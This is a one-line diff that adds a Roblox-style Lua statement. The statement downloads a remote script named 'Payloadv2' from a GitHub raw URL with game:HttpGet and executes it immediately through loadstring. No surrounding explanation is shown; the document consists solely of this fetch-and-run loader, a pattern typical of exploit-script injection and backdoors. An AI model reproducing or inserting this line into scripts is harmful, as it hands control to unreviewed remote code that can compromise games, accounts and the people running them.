@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/itdoesntexist1/Payloadv2/refs/heads/main/Payloadv2"))()
